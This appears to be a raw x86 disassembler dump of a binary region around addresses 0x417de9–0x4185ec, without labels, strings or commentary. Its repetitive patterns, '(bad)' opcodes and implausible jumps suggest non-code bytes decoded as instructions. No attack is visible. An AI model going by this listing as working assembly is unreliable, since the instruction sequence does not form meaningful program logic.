  417de9:	inc    eax
  417dea:	inc    eax
  417deb:	add    eax,0x434162
  417df0:	inc    eax
  417df1:	add    BYTE PTR [edx+0x5],ah
  417df4:	inc    eax
  417df5:	adc    BYTE PTR [edx+0x40],ah
  417df8:	inc    ebx
  417df9:	inc    ecx
  417dfa:	add    eax,0x4340
  417dff:	add    eax,0x404162
  417e04:	add    BYTE PTR [eax+0x43],al
  417e07:	inc    eax
  417e08:	add    eax,0xa58613c0
  417e0d:	out    dx,eax
  417e0e:	or     eax,0x67403430
  417e13:	xor    cl,ah
  417e15:	sbb    cl,bl
  417e17:	cmp    al,0xa5
  417e19:	sub    al,0xc4
  417e1b:	test   DWORD PTR [ebp+0x62],eax
  417e1e:	pop    eax
  417e1f:	inc    esp
  417e20:	xor    eax,0xc5052e40
  417e25:	inc    esi
  417e26:	xor    al,0x51
  417e28:	sub    BYTE PTR [ecx],bh
  417e2a:	stos   BYTE PTR es:[edi],al
  417e2b:	xchg   dl,dh
  417e2d:	xor    eax,0x4048
  417e32:	inc    ecx
  417e33:	inc    ebx
  417e34:	add    eax,0x41784062
  417e39:	inc    eax
  417e3a:	inc    eax
  417e3b:	add    BYTE PTR [edi],cl
  417e3d:	bound  eax,QWORD PTR [ebx+0x0]
  417e40:	add    eax,0x25006240
  417e45:	inc    eax
  417e46:	add    eax,0x40254143
  417e4b:	add    eax,0x6b620000
  417e50:	retf   0x6440
  417e53:	and    eax,0xaa05f152
  417e58:	pop    ds
  417e59:	xor    al,0xc0
  417e5b:	test   cl,dl
  417e5d:	xor    ah,BYTE PTR [ebx-0x57]
  417e60:	out    dx,eax
  417e61:	inc    eax
  417e62:	mov    dh,0x5
  417e64:	push   ebx
  417e65:	inc    ebx
  417e66:	add    BYTE PTR [eax],al
  417e68:	add    BYTE PTR [ecx+0x40],al
  417e6b:	bound  esp,QWORD PTR [esi+0x0]
  417e6e:	inc    eax
  417e6f:	add    eax,0x5400000
  417e74:	inc    ecx
  417e75:	inc    eax
  417e76:	inc    eax
  417e77:	bound  esp,QWORD PTR ds:0x25050043
  417e7d:	inc    ecx
  417e7e:	inc    ebx
  417e7f:	inc    eax
  417e80:	test   BYTE PTR [eax+0x0],al
  417e83:	bound  ebx,QWORD PTR [eax+0x62]
  417e86:	inc    ecx
  417e87:	inc    eax
  417e88:	out    dx,eax
  417e89:	inc    ecx
  417e8a:	inc    ebx
  417e8b:	pop    es
  417e8c:	xor    ecx,ebx
  417e8e:	xchg   al,ah
  417e90:	call   0x4138513d
  417e95:	shl    BYTE PTR [esi],0xd8
  417e98:	(bad)
  417e9d:	pusha  
  417e9e:	sub    DWORD PTR [ebx-0xc67b3b0],0xe
  417ea5:	cmp    al,BYTE PTR ds:0x4105ac42
  417eab:	es (bad) 
  417ead:	into   
  417eae:	xchg   BYTE PTR [ebx-0x6589343d],ch
  417eb4:	mov    ebx,0xf5422f13
  417eb9:	dec    edx
  417eba:	inc    ecx
  417ebb:	test   BYTE PTR [edi+0x10],0x62
  417ebf:	inc    eax
  417ec0:	inc    ecx
  417ec1:	and    eax,0x40000500
  417ec6:	inc    ebx
  417ec7:	add    eax,0x40624041
  417ecc:	inc    ebx
  417ecd:	add    eax,0x43402541
  417ed2:	bound  eax,QWORD PTR [eax+0x43]
  417ed5:	int3   
  417ed6:	inc    eax
  417ed7:	bound  eax,QWORD PTR [eax]
  417ed9:	inc    ecx
  417eda:	inc    eax
  417edb:	inc    eax
  417edc:	add    eax,0xab822405
  417ee1:	fild   QWORD PTR [edi]
  417ee3:	inc    ebx
  417ee4:	xchg   DWORD PTR [ebx+0x4abc05cf],edi
  417eea:	cld    
  417eeb:	xor    BYTE PTR [ebx+0x62],cl
  417eee:	pop    ebp
  417eef:	xchg   BYTE PTR ds:0x473862b4,al
  417ef5:	lahf   
  417ef6:	shl    DWORD PTR [ebx],0xc9
  417ef9:	outs   dx,DWORD PTR ds:[esi]
  417efa:	bound  eax,QWORD PTR [eax+0x12]
  417efd:	inc    eax
  417efe:	jmp    0x417e81
  417f00:	mov    al,0x67
  417f02:	fdiv   QWORD PTR [ecx]
  417f04:	ins    BYTE PTR es:[edi],dx
  417f05:	jne    0x417f14
  417f07:	add    eax,0x25406247
  417f0c:	add    BYTE PTR [esi+0x40],ah
  417f0f:	add    eax,0x40404143
  417f14:	inc    ebx
  417f15:	add    BYTE PTR [eax],al
  417f17:	add    BYTE PTR [edx-0x34],ah
  417f1a:	inc    eax
  417f1b:	add    eax,0x40004041
  417f20:	inc    ecx
  417f21:	int3   
  417f22:	add    BYTE PTR [ebx-0x7c],al
  417f25:	add    eax,0x5406240
  417f2a:	(bad)  
  417f2b:	fadd   QWORD PTR ds:0xcd0f936c
  417f31:	xchg   BYTE PTR [esi],dh
  417f33:	or     bl,0x46
  417f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f37:	lock ss and eax,0x4a1d46ac
  417f3e:	cmp    eax,0x6380c906
  417f43:	in     al,0xc2
  417f45:	(bad)  
  417f47:	push   edx
  417f48:	imul   eax,DWORD PTR ds:0xfa43c24b,0x8643d10d
  417f52:	xor    al,0xc0
  417f54:	or     ch,bl
  417f56:	ret    
  417f57:	push   edx
  417f58:	inc    edi
  417f59:	xor    cl,BYTE PTR [ebp+0x40]
  417f5c:	bound  ebx,QWORD PTR [eax+0x41]
  417f5f:	add    eax,0x40404340
  417f64:	inc    ebx
  417f65:	inc    eax
  417f66:	test   BYTE PTR [eax],al
  417f68:	add    eax,0x40624041
  417f6d:	inc    eax
  417f6e:	add    BYTE PTR [edx+0x5],ah
  417f71:	inc    ebx
  417f72:	add    BYTE PTR [eax+0x78],al
  417f75:	inc    ecx
  417f76:	add    BYTE PTR [eax+0x41],bl
  417f79:	(bad)  
  417f7a:	call   0xdfe9c1b1
  417f7f:	inc    eax
  417f80:	dec    DWORD PTR [edx+0x72481266]
  417f86:	mov    ebx,0x54d00532
  417f8b:	bound  eax,QWORD PTR [ecx-0xa]
  417f8e:	pop    esi
  417f8f:	inc    ecx
  417f90:	xchg   BYTE PTR [eax+0x3c],bh
  417f93:	cmp    DWORD PTR [ebx-0x35],eax
  417f96:	test   DWORD PTR [eax+0x60],0x30d4d83d
  417f9d:	cmp    al,0x57
  417f9f:	es (bad) 
  417fa1:	outs   dx,DWORD PTR ds:[esi]
  417fa2:	cmp    BYTE PTR [ebx+0x34],ah
  417fa5:	rcl    DWORD PTR [ebx],0x3d
  417fa8:	add    eax,0x40a8679c
  417fad:	sub    DWORD PTR [edx+0x40],edx
  417fb0:	xchg   BYTE PTR [eax-0x7c],al
  417fb3:	add    ah,cl
  417fb5:	bound  eax,QWORD PTR ds:0xcc840f41
  417fbb:	inc    ebx
  417fbc:	add    BYTE PTR [eax+0x0],al
  417fbf:	inc    eax
  417fc0:	inc    eax
  417fc1:	inc    eax
  417fc2:	int3   
  417fc3:	add    BYTE PTR ds:0x62404341,al
  417fc9:	pop    eax
  417fca:	add    BYTE PTR [ebx+0x40],al
  417fcd:	bound  ecx,QWORD PTR [edi]
  417fcf:	inc    eax
  417fd0:	test   al,0xbd
  417fd2:	jge    0x418005
  417fd4:	in     al,dx
  417fd5:	cmp    DWORD PTR [ebp+0xda8073d],esi
  417fdb:	ins    BYTE PTR es:[edi],dx
  417fdc:	cmovb  ebp,DWORD PTR [eax]
  417fdf:	std    
  417fe0:	xlat   BYTE PTR ds:[ebx]
  417fe1:	adc    ah,BYTE PTR [ebx+0x63]
  417fe4:	sub    dl,BYTE PTR [ebp+0x13]
  417fe7:	add    eax,0xd06d41bc
  417fec:	mov    ecx,0x864350
  417ff1:	add    BYTE PTR [eax+0x40],al
  417ff4:	cmovno eax,DWORD PTR ds:0x40056243
  417ffb:	int3   
  417ffc:	add    ah,cl
  417ffe:	inc    eax
  417fff:	inc    eax
  418000:	bound  eax,QWORD PTR [ecx+0x0]
  418003:	add    BYTE PTR [edi],cl
  418005:	inc    ebx
  418006:	inc    eax
  418007:	inc    eax
  418008:	add    BYTE PTR [ecx+0x43],al
  41800b:	add    eax,0x40256240
  418010:	bound  eax,QWORD PTR [eax]
  418012:	add    eax,0x53fda06b
  418017:	mov    cl,0x59
  418019:	xor    al,0x43
  41801b:	cmp    BYTE PTR [ebx-0x47],ah
  41801e:	adc    ah,BYTE PTR [ebx]
  418020:	inc    eax
  418021:	cld    
  418022:	dec    esp
  418023:	test   eax,0x31bbe701
  418028:	and    al,0x5
  41802a:	add    eax,0xd4a95491
  41802f:	push   0xfffffffd
  418031:	xchg   bl,cl
  418033:	mov    ah,0x1a
  418035:	inc    ebx
  418036:	mov    ?,WORD PTR [edx-0x33fffabc]
  41803c:	inc    eax
  41803d:	inc    ecx
  41803e:	inc    eax
  41803f:	inc    ebx
  418040:	bound  esp,QWORD PTR ds:0x41400043
  418046:	add    BYTE PTR [eax],al
  418048:	add    eax,0x43624062
  41804d:	inc    ecx
  41804e:	inc    eax
  41804f:	inc    eax
  418050:	inc    eax
  418051:	add    eax,0x40624340
  418056:	add    eax,0x40664140
  41805b:	sub    al,0x43
  41805d:	or     eax,0x6df6339a
  418062:	and    bh,bl
  418064:	pop    esi
  418065:	retf   
  418066:	arpl   WORD PTR [eax],si
  418068:	push   eax
  418069:	mov    esi,0x42340540
  41806e:	xchg   edx,eax
  41806f:	inc    eax
  418070:	xchg   edx,eax
  418071:	jge    0x41802f
  418073:	xchg   BYTE PTR [ecx],dl
  418075:	xor    BYTE PTR [ebx+0x31],0xa0
  418079:	adc    ebp,DWORD PTR [eax]
  41807b:	xor    eax,0x6c701cb0
  418080:	xchg   esp,eax
  418081:	lock adc eax,0xd2550dfa
  418087:	add    BYTE PTR [ecx],al
  418089:	mov    bl,0x43
  41808b:	add    eax,0x50043cd
  418090:	inc    eax
  418091:	js     0x4180a3
  418093:	inc    ecx
  418094:	bound  eax,QWORD PTR [eax+0x40]
  418097:	sldt   WORD PTR [eax-0x34]
  41809b:	js     0x4180ff
  41809d:	add    eax,0x40664143
  4180a2:	inc    ebx
  4180a3:	add    BYTE PTR [ecx+0x5],al
  4180a6:	js     0x4180e8
  4180a8:	bound  eax,QWORD PTR [eax+0x0]
  4180ab:	inc    eax
  4180ac:	retf   
  4180ad:	push   esp
  4180ae:	sub    al,0xe5
  4180b0:	inc    edx
  4180b1:	xlat   BYTE PTR ds:[ebx]
  4180b2:	xchg   BYTE PTR [ecx+0x71],al
  4180b5:	pop    esi
  4180b6:	cmc    
  4180b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180b8:	jne    0x4180fb
  4180ba:	and    edi,ebp
  4180bc:	sti    
  4180bd:	popa   
  4180be:	mov    esi,0xf93f9aa4
  4180c3:	cwde   
  4180c4:	jbe    0x418093
  4180c6:	xchg   di,ax
  4180c8:	push   edx
  4180c9:	inc    eax
  4180ca:	add    eax,0x98fb52ac
  4180cf:	or     BYTE PTR [edx+0x41],bh
  4180d2:	inc    ebx
  4180d3:	inc    eax
  4180d4:	inc    eax
  4180d5:	add    eax,0x434162
  4180da:	inc    eax
  4180db:	add    BYTE PTR [edx+0x5],ah
  4180de:	inc    eax
  4180df:	adc    BYTE PTR [edx+0x40],ah
  4180e2:	inc    ebx
  4180e3:	inc    ecx
  4180e4:	add    eax,0x4340
  4180e9:	add    eax,0x404162
  4180ee:	add    BYTE PTR [eax+0x43],al
  4180f1:	inc    eax
  4180f2:	add    eax,0x70058621
  4180f7:	stos   DWORD PTR es:[edi],eax
  4180f8:	inc    ebx
  4180f9:	mov    WORD PTR [ebx-0x29],gs
  4180fc:	es leave 
  4180fe:	test   al,bl
  418100:	xor    edi,DWORD PTR [esi-0x4b07bd8f]
  418106:	arpl   dx,bx
  418108:	sub    al,0xf7
  41810a:	inc    esi
  41810b:	pop    es
  41810c:	add    eax,0x40627b41
  418111:	jmp    0x418144
  418113:	inc    eax
  418114:	xchg   BYTE PTR [ebx],ch
  418116:	enter  0x31bf,0x18
  41811a:	inc    eax
  41811b:	add    BYTE PTR [eax],al
  41811d:	inc    ecx
  41811e:	inc    ebx
  41811f:	add    eax,0x41784062
  418124:	inc    eax
  418125:	inc    eax
  418126:	add    BYTE PTR [edi],cl
  418128:	bound  eax,QWORD PTR [ebx+0x0]
  41812b:	add    eax,0x25006240
  418130:	inc    eax
  418131:	add    eax,0x40254143
  418136:	add    eax,0x82620000
  41813b:	dec    edx
  41813c:	and    eax,0x6c40e9dc
  418141:	push   esi
  418142:	repnz test al,0xf7
  418145:	bound  ecx,QWORD PTR [ebp+edi*1+0x1d]
  418149:	xchg   esp,eax
  41814a:	mov    bh,0x40
  41814c:	add    eax,0x43524cc9
  418151:	xchg   BYTE PTR [ebp+0x4d],ch
  418154:	xchg   BYTE PTR [ebp+esi*1+0x5c5d1c0],bh
  41815b:	inc    eax
  41815c:	and    al,0x15
  41815e:	fxch   st(3)
  418160:	(bad)  [edx+0x6bf66ef1]
  418166:	call   0x45c1412a
  41816b:	inc    ebx
  41816c:	add    eax,0xb5bf3850
  418171:	inc    ebx
  418172:	add    BYTE PTR [eax],al
  418174:	add    BYTE PTR [ecx+0x40],al
  418177:	bound  esp,QWORD PTR [esi+0x0]
  41817a:	inc    eax
  41817b:	add    eax,0x5400000
  418180:	inc    ecx
  418181:	inc    eax
  418182:	inc    eax
  418183:	bound  esp,QWORD PTR ds:0x25050043
  418189:	inc    ecx
  41818a:	inc    ebx
  41818b:	inc    eax
  41818c:	test   BYTE PTR [eax+0x0],al
  41818f:	bound  ebx,QWORD PTR [eax+0x62]
  418192:	inc    ecx
  418193:	inc    eax
  418194:	(bad)  
  418195:	icebp  
  418196:	inc    eax
  418197:	xchg   BYTE PTR ds:0x192f620,dl
  41819d:	inc    ecx
  41819e:	cmp    bh,BYTE PTR [ebx]
  4181a0:	retf   
  4181a1:	cmp    esp,esp
  4181a3:	inc    ecx
  4181a4:	mov    ebp,0x49f559b1
  4181a9:	test   BYTE PTR [eax+0x40532443],ch
  4181af:	add    eax,0x301237ab
  4181b4:	pop    esi
  4181b5:	pop    edi
  4181b6:	mov    esp,0x1344686
  4181bb:	sub    BYTE PTR [edi+0x41604a42],ah
  4181c1:	push   esi
  4181c2:	adc    BYTE PTR [edx+0x40],ah
  4181c5:	inc    ecx
  4181c6:	and    eax,0x40000500
  4181cb:	inc    ebx
  4181cc:	add    eax,0x40624041
  4181d1:	inc    ebx
  4181d2:	add    eax,0x43402541
  4181d7:	bound  eax,QWORD PTR [eax+0x43]
  4181da:	int3   
  4181db:	inc    eax
  4181dc:	bound  eax,QWORD PTR [eax]
  4181de:	inc    ecx
  4181df:	inc    eax
  4181e0:	inc    eax
  4181e1:	add    eax,0xbb405405
  4181e6:	sbb    al,0x35
  4181e8:	hlt    
  4181e9:	and    BYTE PTR [edi-0x33],cl
  4181ec:	xor    DWORD PTR [eax-0x4bfabed4],ebx
  4181f2:	pushf  
  4181f3:	mov    esp,0x713b296c
  4181f8:	xchg   BYTE PTR ds:0xa03a0d54,al
  4181fe:	xor    eax,DWORD PTR [ecx+0x34]
  418201:	xchg   DWORD PTR [ebx],esp
  418203:	retf   
  418204:	inc    ebx
  418205:	mov    edi,DWORD PTR ds:0x2549f363
  41820b:	mov    al,0xd1
  41820d:	push   cs
  41820e:	inc    edi
  41820f:	inc    eax
  418210:	add    eax,0x104c5436
  418215:	into   
  418216:	mov    al,0x60
  418218:	xchg   BYTE PTR [edx-0x50],al
  41821b:	ret    
  41821c:	(bad)  
  41821d:	sbb    BYTE PTR [edx+0x62],bh
  418220:	inc    eax
  418221:	and    eax,0x5406600
  418226:	inc    ebx
  418227:	inc    ecx
  418228:	inc    eax
  418229:	inc    eax
  41822a:	inc    ebx
  41822b:	add    BYTE PTR [eax],al
  41822d:	add    BYTE PTR [edx-0x34],ah
  418230:	inc    eax
  418231:	add    eax,0x40004041
  418236:	inc    ecx
  418237:	int3   
  418238:	add    BYTE PTR [ebx-0x7c],al
  41823b:	add    eax,0x5406240
  418240:	bound  eax,QWORD PTR [ecx+0x25]
  418243:	(bad)  
  418244:	cmp    al,0xd4
  418246:	cli    
  418247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418248:	inc    ebx
  418249:	inc    eax
  41824a:	repnz and al,0x68
  41824d:	arpl   WORD PTR ds:0x52cb009,ax
  418253:	mov    ecx,0x6240604f
  418258:	pop    eax
  418259:	inc    ecx
  41825a:	add    eax,0x40404340
  41825f:	inc    ebx
  418260:	inc    eax
  418261:	test   BYTE PTR [eax],al
  418263:	add    eax,0x40624041
  418268:	inc    eax
  418269:	add    BYTE PTR [edx+0x5],ah
  41826c:	inc    ebx
  41826d:	add    BYTE PTR [eax+0x78],al
  418270:	inc    ecx
  418271:	add    BYTE PTR [eax+0x41],bl
  418274:	bound  eax,QWORD PTR [ecx-0x53]
  418277:	sub    al,0x57
  418279:	xchg   cl,al
  41827b:	fsubr  QWORD PTR [eax]
  41827d:	inc    ebx
  41827e:	push   ds
  41827f:	mov    BYTE PTR [eax+0x33],al
  418282:	mov    esp,0xca301261
  418287:	icebp  
  418288:	pop    ss
  418289:	icebp  
  41828a:	or     eax,0xd024519c
  41828f:	(bad)  
  418290:	stos   BYTE PTR es:[edi],al
  418291:	add    eax,0x84406b
  418296:	int3   
  418297:	bound  eax,QWORD PTR ds:0xcc840f41
  41829d:	inc    ebx
  41829e:	add    BYTE PTR [eax+0x0],al
  4182a1:	inc    eax
  4182a2:	inc    eax
  4182a3:	inc    eax
  4182a4:	int3   
  4182a5:	add    BYTE PTR ds:0x62404341,al
  4182ab:	pop    eax
  4182ac:	add    BYTE PTR [ebx+0x40],al
  4182af:	bound  ecx,QWORD PTR [edi]
  4182b1:	inc    eax
  4182b2:	data16 test BYTE PTR [eax+0x34],0x11
  4182b7:	inc    eax
  4182b8:	xchg   BYTE PTR [eax+0x40],dl
  4182bb:	dec    edi
  4182bc:	xor    DWORD PTR [edi],edx
  4182be:	push   eax
  4182bf:	das    
  4182c0:	outs   dx,DWORD PTR ds:[esi]
  4182c1:	or     eax,0x9b6cb828
  4182c6:	div    DWORD PTR [ebx-0x10]
  4182c9:	retf   
  4182ca:	push   edx
  4182cb:	inc    esp
  4182cc:	xlat   BYTE PTR ds:[ebx]
  4182cd:	push   0x48
  4182cf:	inc    eax
  4182d0:	add    eax,0x43d2de20
  4182d5:	stos   BYTE PTR es:[edi],al
  4182d6:	jb     0x418308
  4182d8:	xchg   BYTE PTR [eax],al
  4182da:	add    BYTE PTR [eax+0x40],al
  4182dd:	cmovno eax,DWORD PTR ds:0x40056243
  4182e4:	int3   
  4182e5:	add    ah,cl
  4182e7:	inc    eax
  4182e8:	inc    eax
  4182e9:	bound  eax,QWORD PTR [ecx+0x0]
  4182ec:	add    BYTE PTR [edi],cl
  4182ee:	inc    ebx
  4182ef:	inc    eax
  4182f0:	inc    eax
  4182f1:	add    BYTE PTR [ecx+0x43],al
  4182f4:	add    eax,0x40256240
  4182f9:	bound  eax,QWORD PTR [eax]
  4182fb:	xor    al,0xdc
  4182fd:	push   esp
  4182fe:	shl    DWORD PTR [ebx-0x11],1
  418301:	inc    eax
  418302:	pusha  
  418303:	push   eax
  418304:	mov    esi,0x340ea163
  418309:	cmp    edi,ebp
  41830b:	add    eax,0xc9cf6bf1
  418310:	push   eax
  418311:	dec    ebp
  418312:	add    eax,0x2333d97b
  418317:	inc    eax
  418318:	jo     0x41835a
  41831a:	xchg   BYTE PTR [esp+ebp*8+0x25401ab4],bh
  418321:	add    esi,DWORD PTR [eax*1+0x4041c200]
  418328:	push   ecx
  418329:	(bad)  
  41832a:	out    dx,al
  41832b:	retf   
  41832c:	imul   ebx,DWORD PTR [ebx],0x53b10443
  418332:	add    eax,0xcc00054d
  418337:	inc    eax
  418338:	inc    ecx
  418339:	inc    eax
  41833a:	inc    ebx
  41833b:	bound  esp,QWORD PTR ds:0x41400043
  418341:	add    BYTE PTR [eax],al
  418343:	add    eax,0x43624062
  418348:	inc    ecx
  418349:	inc    eax
  41834a:	inc    eax
  41834b:	inc    eax
  41834c:	add    eax,0x40624340
  418351:	add    eax,0x40664140
  418356:	pop    eax
  418357:	arpl   WORD PTR [eax],si
  418359:	inc    eax
  41835a:	inc    ebx
  41835b:	inc    ecx
  41835c:	xchg   BYTE PTR [ebx],al
  41835e:	inc    ebx
  41835f:	add    al,0x20
  418361:	inc    eax
  418362:	lock inc ecx
  418364:	sub    DWORD PTR [ebp+ebx*8+0x27404034],eax
  41836b:	inc    eax
  41836c:	in     eax,dx
  41836d:	inc    ebx
  41836e:	add    BYTE PTR ds:0x41107840,al
  418374:	bound  eax,QWORD PTR [eax+0x40]
  418377:	sldt   WORD PTR [eax-0x34]
  41837b:	js     0x4183df
  41837d:	add    eax,0x40664143
  418382:	inc    ebx
  418383:	add    BYTE PTR [ecx+0x5],al
  418386:	js     0x4183c8
  418388:	bound  eax,QWORD PTR [eax+0x0]
  41838b:	inc    eax
  41838c:	cmp    DWORD PTR ds:0xa0c3182,eax
  418392:	sub    eax,0xc3a8ec05
  418397:	ins    BYTE PTR es:[edi],dx
  418398:	inc    eax
  418399:	repz and eax,DWORD PTR [esi-0xb4fef9d]
  4183a0:	adc    cl,BYTE PTR [esi+0x40]
  4183a3:	and    al,0xd1
  4183a5:	mov    esp,0xd240430f
  4183aa:	inc    ecx
  4183ab:	inc    ebx
  4183ac:	inc    eax
  4183ad:	inc    eax
  4183ae:	add    eax,0x434162
  4183b3:	inc    eax
  4183b4:	add    BYTE PTR [edx+0x5],ah
  4183b7:	inc    eax
  4183b8:	adc    BYTE PTR [edx+0x40],ah
  4183bb:	inc    ebx
  4183bc:	inc    ecx
  4183bd:	add    eax,0x4340
  4183c2:	add    eax,0x404162
  4183c7:	add    BYTE PTR [eax+0x43],al
  4183ca:	inc    eax
  4183cb:	add    eax,0x41dcec32
  4183d0:	out    dx,eax
  4183d1:	rcl    DWORD PTR ds:0xe005771b,1
  4183d7:	adc    eax,0x38401367
  4183dc:	inc    eax
  4183dd:	xchg   BYTE PTR [ecx],ch
  4183df:	xor    BYTE PTR ds:0x2f426e28,cl
  4183e5:	and    eax,0x76cb0cad
  4183ea:	inc    eax
  4183eb:	xor    DWORD PTR [ebx],ecx
  4183ed:	jmp    0x418451
  4183ef:	cwde   
  4183f0:	push   edx
  4183f1:	pop    ebx
  4183f2:	push   cs
  4183f3:	inc    edi
  4183f4:	inc    eax
  4183f5:	add    eax,0x4092
  4183fa:	inc    ecx
  4183fb:	inc    ebx
  4183fc:	add    eax,0x41784062
  418401:	inc    eax
  418402:	inc    eax
  418403:	add    BYTE PTR [edi],cl
  418405:	bound  eax,QWORD PTR [ebx+0x0]
  418408:	add    eax,0x25006240
  41840d:	inc    eax
  41840e:	add    eax,0x40254143
  418413:	add    eax,0x68620000
  418418:	stos   DWORD PTR es:[edi],eax
  418419:	inc    ecx
  41841a:	inc    eax
  41841b:	ficom  WORD PTR [ebp+0x412c5086]
  418421:	inc    edi
  418422:	(bad)  
  418424:	adc    BYTE PTR [eiz*1+0x40247f30],ah
  41842b:	push   edx
  41842c:	inc    edi
  41842d:	jmp    0x5109:0x1c9073c8
  418434:	inc    eax
  418435:	add    eax,0x4065fcd0
  41843a:	inc    eax
  41843b:	inc    ecx
  41843c:	xor    eax,DWORD PTR [esi+0x31fd4144]
  418442:	adc    al,0x39
  418444:	cli    
  418445:	and    esi,DWORD PTR [edx]
  418447:	(bad)  
  418448:	aam    0x6c
  41844a:	inc    eax
  41844b:	std    
  41844c:	inc    ebx
  41844d:	jmp    0x919d9f59
  418452:	add    eax,DWORD PTR [ebx+0x0]
  418455:	add    BYTE PTR [eax],al
  418457:	inc    ecx
  418458:	inc    eax
  418459:	bound  esp,QWORD PTR [esi+0x0]
  41845c:	inc    eax
  41845d:	add    eax,0x5400000
  418462:	inc    ecx
  418463:	inc    eax
  418464:	inc    eax
  418465:	bound  esp,QWORD PTR ds:0x25050043
  41846b:	inc    ecx
  41846c:	inc    ebx
  41846d:	inc    eax
  41846e:	test   BYTE PTR [eax+0x0],al
  418471:	bound  ebx,QWORD PTR [eax+0x62]
  418474:	inc    ecx
  418475:	inc    eax
  418476:	cmc    
  418477:	sbb    al,BYTE PTR ds:0x43bcd0f0
  41847d:	inc    eax
  41847e:	and    DWORD PTR [eax-0x7a],eax
  418481:	lds    edx,FWORD PTR [ebp+0x67]
  418484:	rcl    DWORD PTR ds:0x44222612,1
  41848a:	test   al,0x8e
  41848c:	add    eax,DWORD PTR [eax+0x2f]
  41848f:	inc    eax
  418490:	call   0x28ddc175
  418495:	adc    bh,BYTE PTR [esp+ebp*1-0x1c]
  418499:	push   eax
  41849a:	jmp    0x4140:0x62105c62
  4184a1:	and    eax,0x40000500
  4184a6:	inc    ebx
  4184a7:	add    eax,0x40624041
  4184ac:	inc    ebx
  4184ad:	add    eax,0x43402541
  4184b2:	bound  eax,QWORD PTR [eax+0x43]
  4184b5:	int3   
  4184b6:	inc    eax
  4184b7:	bound  eax,QWORD PTR [eax]
  4184b9:	inc    ecx
  4184ba:	inc    eax
  4184bb:	inc    eax
  4184bc:	add    eax,0x18574005
  4184c1:	inc    eax
  4184c2:	sub    al,0x64
  4184c4:	les    esp,FWORD PTR [esi-0x5eb16eec]
  4184ca:	pushf  
  4184cb:	and    cl,BYTE PTR [edi+0x28]
  4184ce:	inc    eax
  4184cf:	inc    ebp
  4184d0:	inc    eax
  4184d1:	jl     0x4184e8
  4184d3:	push   0xb41342cc
  4184d8:	or     BYTE PTR [ebx-0x37],ah
  4184db:	bound  eax,QWORD PTR [edx-0x1d9dbf93]
  4184e1:	mov    ch,0x50
  4184e3:	bound  eax,QWORD PTR [eax+0x25]
  4184e6:	add    BYTE PTR [esi+0x40],ah
  4184e9:	add    eax,0x40404143
  4184ee:	inc    ebx
  4184ef:	add    BYTE PTR [eax],al
  4184f1:	add    BYTE PTR [edx-0x34],ah
  4184f4:	inc    eax
  4184f5:	add    eax,0x40004041
  4184fa:	inc    ecx
  4184fb:	int3   
  4184fc:	add    BYTE PTR [ebx-0x7c],al
  4184ff:	add    eax,0x5406240
  418504:	bound  eax,QWORD PTR [eax+0x3e]
  418507:	cmp    al,0xe
  418509:	inc    edx
  41850a:	dec    eax
  41850b:	(bad)  
  41850c:	adc    eax,0x4062f859
  418511:	xor    BYTE PTR [eax+0x4f],bh
  418514:	retf   
  418515:	sub    BYTE PTR [esp+eax*2+0x9],ah
  418519:	ja     0x41855b
  41851b:	inc    ebp
  41851c:	inc    eax
  41851d:	bound  ebx,QWORD PTR [eax+0x41]
  418520:	add    eax,0x40404340
  418525:	inc    ebx
  418526:	inc    eax
  418527:	test   BYTE PTR [eax],al
  418529:	add    eax,0x40624041
  41852e:	inc    eax
  41852f:	add    BYTE PTR [edx+0x5],ah
  418532:	inc    ebx
  418533:	add    BYTE PTR [eax+0x78],al
  418536:	inc    ecx
  418537:	add    BYTE PTR [eax+0x41],bl
  41853a:	bound  eax,QWORD PTR [ebx-0x32]
  41853d:	xor    edx,DWORD PTR [eax+0x40]
  418540:	inc    eax
  418541:	je     0x418584
  418543:	or     eax,0x1f6ba83b
  418548:	add    eax,DWORD PTR [eax-0x4]
  41854b:	inc    eax
  41854c:	adc    esp,DWORD PTR [eax-0x55]
  41854f:	inc    eax
  418550:	sub    BYTE PTR [eax+0x1c],dh
  418553:	bound  eax,QWORD PTR [ecx+edi*1-0x7bbfeb52]
  41855a:	add    ah,cl
  41855c:	bound  eax,QWORD PTR ds:0xcc840f41
  418562:	inc    ebx
  418563:	add    BYTE PTR [eax+0x0],al
  418566:	inc    eax
  418567:	inc    eax
  418568:	inc    eax
  418569:	int3   
  41856a:	add    BYTE PTR ds:0x62404341,al
  418570:	pop    eax
  418571:	add    BYTE PTR [ebx+0x40],al
  418574:	bound  ecx,QWORD PTR [edi]
  418576:	inc    eax
  418577:	inc    edx
  418578:	loopne 0x4185dc
  41857a:	sbb    BYTE PTR [edx],0xe7
  41857d:	inc    ebx
  41857e:	inc    eax
  41857f:	adc    BYTE PTR [eax-0x8],al
  418582:	add    eax,0x10d26209
  418587:	add    DWORD PTR [edx-0x3d],esi
  41858a:	xchg   DWORD PTR ds:0x474018e3,edx
  418590:	inc    eax
  418591:	mov    edi,0x41c56591
  418596:	sbb    DWORD PTR [eax+0x6d],esi
  418599:	mov    edi,0x254f4cbf
  41859e:	inc    eax
  41859f:	jne    0x4185e1
  4185a1:	(bad)  [esi+ecx*1+0x50]
  4185a5:	add    BYTE PTR [eax],al
  4185a7:	inc    eax
  4185a8:	inc    eax
  4185a9:	cmovno eax,DWORD PTR ds:0x40056243
  4185b0:	int3   
  4185b1:	add    ah,cl
  4185b3:	inc    eax
  4185b4:	inc    eax
  4185b5:	bound  eax,QWORD PTR [ecx+0x0]
  4185b8:	add    BYTE PTR [edi],cl
  4185ba:	inc    ebx
  4185bb:	inc    eax
  4185bc:	inc    eax
  4185bd:	add    BYTE PTR [ecx+0x43],al
  4185c0:	add    eax,0x40256240
  4185c5:	bound  eax,QWORD PTR [eax]
  4185c7:	adc    DWORD PTR [edx],edx
  4185c9:	inc    eax
  4185ca:	add    ebp,esi
  4185cc:	or     BYTE PTR [ebp+0x634041b4],cl
  4185d2:	inc    eax
  4185d3:	test   al,0x44
  4185d5:	bound  eax,QWORD PTR [edx+0x47]
  4185d8:	add    eax,DWORD PTR [eax+0x13]
  4185db:	inc    esp
  4185dc:	dec    ebx
  4185dd:	in     eax,dx
  4185de:	cmp    ah,BYTE PTR [eax+eax*2]
  4185e1:	jp     0x418623
  4185e3:	leave  
  4185e4:	xor    BYTE PTR ds:0x4140cc00,al
  4185ea:	inc    eax
  4185eb:	inc    ebx
  4185ec:	bound  esp,QWORD PTR ds:0x41400043
